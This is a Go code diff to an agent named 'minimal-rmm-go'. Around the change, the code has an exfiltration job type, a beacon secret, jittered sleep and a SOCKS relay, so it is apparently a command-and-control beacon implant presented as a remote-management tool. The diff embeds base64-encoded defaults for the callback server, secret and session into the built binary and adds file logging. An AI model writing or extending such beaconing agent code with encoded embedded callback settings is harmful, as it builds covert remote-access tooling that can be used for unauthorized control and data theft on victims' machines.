@@ -80,12 +80,28 @@ type exfilJob struct {
 	Env         map[string]string `json:"env"`
 }
 
+// These values are injected by the authenticated server build endpoint. They
+// are encoded to keep linker arguments safe; environment variables override
+// them at runtime.
+var (
+	defaultBaseURLB64       string
+	defaultBeaconSecretB64  string
+	defaultSessionIDB64     string
+	defaultHTTPProxyB64     string
+	defaultSleepSecondsB64  string
+	defaultJitterPercentB64 string
+	logMu                   sync.Mutex
+	logFile                 *os.File
+)
+
 func main() {
+	initAgentLog()
 	cfg, err := loadConfig()
 	if err != nil {
-		fmt.Fprintln(os.Stderr, err)
+		logf("configuration error: %v", err)
 		os.Exit(2)
 	}
+	logf("starting agent for %s", cfg.BaseURL)
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 	client := newHTTPClient(cfg)
 	relay := newSocksRelay()
@@ -109,12 +125,12 @@ func main() {
 
 func loadConfig() (*config, error) {
 	cfg := &config{
-		BaseURL:       strings.TrimRight(envOr("RMM_BASE_URL", ""), "/"),
-		BeaconSecret:  envOr("RMM_BEACON_SECRET", ""),
-		SessionID:     envOr("RMM_SESSION_ID", ""),
-		HTTPProxy:     strings.TrimSpace(envOr("RMM_HTTP_PROXY", "")),
-		SleepSeconds:  envInt("RMM_SLEEP_SECONDS", 60),
-		JitterPercent: envInt("RMM_JITTER_PERCENT", 30),
+		BaseURL:       strings.TrimRight(envOr("RMM_BASE_URL", embeddedValue(defaultBaseURLB64)), "/"),
+		BeaconSecret:  envOr("RMM_BEACON_SECRET", embeddedValue(defaultBeaconSecretB64)),
+		SessionID:     envOr("RMM_SESSION_ID", embeddedValue(defaultSessionIDB64)),
+		HTTPProxy:     strings.TrimSpace(envOr("RMM_HTTP_PROXY", embeddedValue(defaultHTTPProxyB64))),
+		SleepSeconds:  envInt("RMM_SLEEP_SECONDS", envIntValue(defaultSleepSecondsB64, 60)),
+		JitterPercent: envInt("RMM_JITTER_PERCENT", envIntValue(defaultJitterPercentB64, 30)),
 		MaxRetries:    envInt("RMM_MAX_RETRIES", 3),
 	}
 	if cfg.BaseURL == "" || cfg.BeaconSecret == "" {
@@ -664,6 +680,26 @@ func envInt(name string, fallback int) int {
 	}
 	return n
 }
+func embeddedValue(value string) string {
+	if value == "" {
+		return ""
+	}
+	decoded, err := base64.StdEncoding.DecodeString(value)
+	if err != nil {
+		return ""
+	}
+	return string(decoded)
+}
+func envIntValue(value string, fallback int) int {
+	return envIntValueString(embeddedValue(value), fallback)
+}
+func envIntValueString(value string, fallback int) int {
+	n, err := strconv.Atoi(value)
+	if err != nil {
+		return fallback
+	}
+	return n
+}
 func sleepWithJitter(cfg *config, rng *rand.Rand) {
 	delay := cfg.SleepSeconds
 	if cfg.JitterPercent > 0 {
@@ -676,5 +712,20 @@ func sleepWithJitter(cfg *config, rng *rand.Rand) {
 	time.Sleep(time.Duration(delay) * time.Second)
 }
 func logf(format string, args ...any) {
-	fmt.Fprintf(os.Stderr, "[minimal-rmm-go] "+format+"\n", args...)
+	line := fmt.Sprintf("[minimal-rmm-go] "+format+"\n", args...)
+	_, _ = fmt.Fprint(os.Stderr, line)
+	logMu.Lock()
+	defer logMu.Unlock()
+	if logFile != nil {
+		_, _ = logFile.WriteString(line)
+		_ = logFile.Sync()
+	}
+}
+
+func initAgentLog() {
+	path := envOr("RMM_LOG_FILE", filepath.Join(os.TempDir(), "minimal-rmm-agent.log"))
+	file, err := os.OpenFile(path, os.O_CREATE|os.O_APPEND|os.O_WRONLY, 0600)
+	if err == nil {
+		logFile = file
+	}
 }
